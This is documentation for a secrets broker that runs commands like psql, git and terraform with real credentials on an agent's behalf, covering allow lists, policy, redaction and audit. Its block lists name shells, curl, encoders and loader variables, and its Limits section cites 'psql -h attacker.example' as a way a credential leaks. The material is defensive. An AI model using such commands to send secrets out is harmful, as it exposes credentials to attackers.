# Exec broker

Some tools need a secret in their own process: `psql` reads `PGPASSWORD`, `terraform` reads
`TF_VAR_*`, a deploy script reads `KUBE_TOKEN`. The tool proxy cannot help when the tool never sends
the secret over HTTP through scrim. The exec broker runs such a command for the agent: the agent asks
for `psql -h db.internal` with `PGPASSWORD` set to a placeholder, scrim runs `psql` as another user
with the real password, and the agent gets back the exit status and the output, with the password
replaced by its placeholder.

The agent's process never holds the value, and neither does any process the agent can read.

## Asking for a command

The broker is the `secret_exec` MCP tool, the `scrim exec` command and `POST /v1/exec` on the local
agent API. All three take the same request:

| Field | Meaning |
| --- | --- |
| `command` | program name and arguments, run without a shell; a name such as `git`, never a path |
| `env` | variables to set; put a placeholder where the secret's value belongs |
| `stdin` | standard input, where the command allows placeholders there |
| `dir` | absolute working directory, where the command allows it; default a fresh empty directory |
| `timeout_seconds` | at most `exec.timeout` |

<!-- docs-test: skip: needs a configured database and exec.commands entry -->

```sh
scrim exec --env PGPASSWORD=SCRIM_DB_PASSWORD -- psql -h db.internal -U app -c 'select count(*) from jobs'
```

Any placeholder form works: the bracket placeholder the model sees (`⟦scrim:db:01…⟧`), a declared
catalog placeholder (`SCRIM_DB_PASSWORD`) or a reference placeholder (`{{scrim:bao://kv/app/db#password}}`
or `{{scrim:db}}`). A placeholder-shaped text that names no credential with a value refuses the
whole request; nothing runs with the placeholder as text. A request that names no secret at all is
refused too: the agent can run that command itself.

The answer:

```json
{"exit_code": 0, "stdout": " count \n-------\n    42\n", "stderr": "", "refs": ["bao://kv/app/db#password"]}
```

`withheld` names a stream that was not returned and why, `redactions` counts values replaced in the
output and `timed_out` says the command was killed at its time limit (`exit_code` is then -1).
`scrim exec` prints the streams and exits with the command's status, or 1 for an error and 3 when
scrim refused to run it; with `--output json` it prints the answer as above.

## Allowing commands

A command runs with a secret when the secret's allow list names it, or when a policy rule allows
it. The allow list is `exec.commands` in the configuration:

```yaml
exec:
  user: scrim-exec                 # run commands as this user (see "Who runs the command")
  commands:
    psql:
      path: /usr/bin/psql
      secrets: [db]                # catalog names, references or globs (bao://kv/app/**)
      env-names: [PGPASSWORD]      # variables the agent may set
      args:                        # the shell-quoted arguments must match one in full
        - "-h db\\.internal -U app( -c .*)?"
    git:
      path: /usr/bin/git
      secrets: [github]
      inject: [args]               # the token goes into the remote URL
      dirs: [/home/alice/src/**]   # where the agent may run it
      args:
        - "push https://x-access-token:SCRIM_GITHUB_TOKEN@github\\.com/acme/[a-z-]+\\.git( [A-Za-z0-9._/:-]+)*"
```

| Field | Meaning |
| --- | --- |
| `path` | absolute path of the program; the agent's `PATH` is never used |
| `secrets` | the secrets this command may receive, by catalog name or reference, `*` and `**` globs as in policy |
| `inject` | where placeholders are replaced: `env` (default), `args`, `stdin` |
| `env-names` | globs of the variables the agent may set; without it the agent sets none |
| `env` | fixed variables, not secret, which the agent cannot override |
| `dirs` | globs of the working directories the agent may choose, checked after resolving links; without it the command runs in a fresh empty directory |
| `args` | regular expressions over the arguments as the agent wrote them (placeholders, not values), shell-quoted; one must match the whole string |
| `timeout` | a shorter limit than `exec.timeout` |

A program that is not in `exec.commands` is looked up in `exec.path` and runs only when a rule
allows it, with placeholders in the environment only.

### Policy

Every secret a command would receive is decided as `op == "exec"` through the same path as every
other decision: break-glass, rules, grants, approvals and audit. The request carries `secret.ref`,
`secret.name`, `secret.store`, `secret.class`, `secret.labels`, the agent, `tool.name` (the command
name, `git`) and `tool.command` (the whole command line with placeholders, `git push origin main`),
which an approver sees as well.

For a command on the secret's allow list, the default decision is allow (audited as rule
`exec.allow-list`); for any other command it is `policy.default`. Rules still apply on top: a deny
rule refuses, an ask rule holds the command until a person approves it, and a grant from an earlier
approval covers the next run.

```yaml
- name: pushes-need-a-human
  decision: ask
  when: op == "exec" && tool.name == "git" && tool.command.startsWith("git push ")
  grant: {ttl: 30m, scope: secret}
- name: no-prod-from-agents
  decision: deny
  when: op == "exec" && secret.ref.glob("bao://kv/prod/**")
```

## What is always refused

These hold whatever the allow list and the rules say:

- Programs that print, encode, split or reorder their input or environment (`echo`, `printf`,
  `printenv`, `cat`, `base64`, `xxd`, `od`, `rev`, `tr`, `cut`, `sed`, `awk`, `jq`, compressors and
  checksums, `curl`), shells (`sh`, `bash`, `zsh`, `busybox`), programs that run other programs
  (`env`, `xargs`, `sudo`, `timeout`, `find`, `make`) and interpreters (`python3`, `perl`, `node`,
  editors and pagers). The name the agent used, the program's file name and the file a link resolves
  to are all checked, so `python3` linked to `python3.12` is caught. An `exec.commands` entry for one
  of them fails configuration validation. The refusal is audited as `blocked transform: <name>`.
- Variables that make the loader, a shell or a common tool run code or read configuration the agent
  chose: `LD_*`, `DYLD_*`, `PATH`, `HOME`, `XDG_*`, `BASH_ENV`, `GIT_*`, `KUBECONFIG`, `PYTHON*`,
  `NODE_OPTIONS` and similar.
- For `git`: only `push`, `fetch`, `ls-remote` and `clone`; no `-c`, `-C`, `--config-env`,
  `--exec-path`, `--upload-pack`, `--receive-pack`, `--git-dir` or `ext::` URLs. Git runs with its
  configuration overridden at command-line scope (`GIT_CONFIG_COUNT`), above every file the agent
  can write: no hooks, no fsmonitor, no credential helpers, `ssh` as the ssh command, only the
  `https` and `ssh` protocols.
- For `kubectl`: no `exec`, `attach`, `cp`, `debug`, `run`, `port-forward`, `proxy`, `plugin`,
  `config`, `edit` or `--kubeconfig`. For `terraform` and `tofu`: no `console` and no `-chdir`.

## Who runs the command

The command runs as a different operating-system user than the agent, so the agent cannot read its
environment (`/proc/<pid>/environ`) or attach to it. That is what keeps the secret out of the
agent's reach while the command runs.

- `exec.user` names the user. scrim needs the right to switch users for it, so this is the setting
  for a system service (`scrim install --system`) or a container that starts as root. The command
  gets that user's primary group and no supplementary groups.
- Without `exec.user`, commands run as scrim's own user. That is a separate identity when scrim runs
  as a service user and the agent as a person's user, but the command can then read whatever
  scrim's user can, its state and keys included. Prefer a dedicated `exec.user` with access to
  nothing but what the commands need.
- A command never runs as root, and never as the calling agent's user: the broker refuses and says
  so. `exec.allow-same-user` lifts the second rule for single-user development; it is a weakening
  setting, logged at start-up and listed in `scrim status`.

The command starts from scrim, not from the agent: outside the agent's process tree, mount and
user namespaces, and its file system view under `scrim run`. Its environment is built from nothing
(`PATH` from `exec.path`, the run-as user's `HOME`, the fixed `env`, the agent's permitted
variables). It runs in its own process group, killed whole at `exec.timeout` and when scrim exits.

## Output

Standard output and standard error are collected separately, up to `exec.max-output` each, and run
through the data plane's redactor and guard, the same as a provider request: every known value and
its encoded variants become placeholders. The broker then checks each stream itself for the values
it injected, verbatim and as hex, base64 (at every alignment), base32, percent-encoding and
reversed. A stream is withheld, never cut or repaired, when

- it is larger than `exec.max-output` (cutting it could split a value past redaction),
- the redactor fails or is not running,
- the broker's own check still finds a value after redaction,
- it is not UTF-8 text.

The exit status is always returned.

## Audit

Each request writes a `tool.secret_exec` entry with the agent, the secrets used, the outcome and a
value-free detail (`exit 0, 2 values redacted, stderr withheld`, `blocked transform: base64`), and
each secret's decision a `decision` entry with `action=exec`, the rule and any approval or grant.

## Limits

The broker controls which program runs, with which arguments and environment, and what comes back.
It does not control what an allowed program does with the secret:

- A program sends the secret where its arguments point. `psql -h attacker.example` or a `git push` to
  another remote sends the credential there. Pin destinations with `args`, or in the fixed `env`.
- A program that loads code from its working directory runs that code with the secret: terraform
  providers in `.terraform`, kubeconfig exec plugins, Makefiles. Git's hooks and helpers are switched
  off; for the others, list in `dirs` only directories the agent cannot write, or accept the risk.
- A program that writes the secret somewhere the agent can read (a file in `dir`, a commit message)
  hands it over. Prefer `env` for secrets; allow `args` and `stdin` only for commands that need them.
- The control plane's copy of a value is wiped after the command starts, but the Go runtime copies
  the environment and arguments while it forks, and those copies are garbage-collected, not wiped.

## Central scrim in Kubernetes

Where scrim runs centrally, the edge forwarder in an agent pod forwards `POST /v1/exec` to the
central broker ([edge-forwarder.md](edge-forwarder.md)), which runs the command in the central scrim
container, not in the agent pod. The Helm chart's defaults decide what that means:

- There is no other user to run it as. The chart runs scrim as UID 65532 with every capability
  dropped and no privilege escalation, so scrim cannot switch users: leave `exec.user` empty, or
  every command fails to start. Commands run as scrim's own user. The agent is in another pod and
  cannot read the process, and the same-user check does not apply to callers that come through the
  edge listener.
- The command can read everything scrim's user can read in that container: the interception CA key,
  the placeholder keys, the edge CA key, store credentials and tokens mounted for scrim, and scrim's
  state and socket directories. Allow only programs you would trust with all of that, pin their
  arguments with `args`, and keep `dirs` unset so each command starts in a fresh empty directory.
- The release image is distroless and holds only scrim, so `exec.path` finds nothing and
  `exec.commands` paths do not exist. Build an image from the scrim image that adds the programs,
  statically linked since the base has no C library, and set the chart's `image` to it.
  `test/k8s/edge/Containerfile.scrim` does this for the end-to-end test.
